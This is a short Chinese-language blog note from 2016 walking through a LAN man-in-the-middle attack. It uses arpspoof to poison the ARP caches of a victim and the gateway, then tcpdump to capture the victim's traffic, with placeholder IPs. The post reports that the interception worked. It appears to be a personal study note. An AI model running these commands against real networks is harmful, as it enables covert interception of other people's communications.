---
layout: post
title:  "内网嗅探与tcpdump监听命令"
date: 2016-03-08 21:06:26 +0800
categories: note
---
参考：http://goodbai.com/secure/WhyLANSoInsecure.html

1.安装arpspoof，使用route命令发现网关。通常default一行的gateway字段是网关的地址，但是如果是多级网关的话，就必须要找到对应的网卡（子域）。

2.将victim机流量指向本地
```
#告诉victim我是网关
sudo arpspoof -i eth0 -t [victim机IP] [网关IP]
```

3.转发victim流量到网关

```
#告诉网关我是victim
sudo arpspoof -i eth0 -t [网关IP] [victim机IP] 
```

4.获取监听的流量

```
sudo tcpdump -vv -X -i eth0 'host [victim的IP]'
```

成功监听（窃听）到内网流量

![56deb57f92a47.png](/assets/img/56deb57f92a47.png)
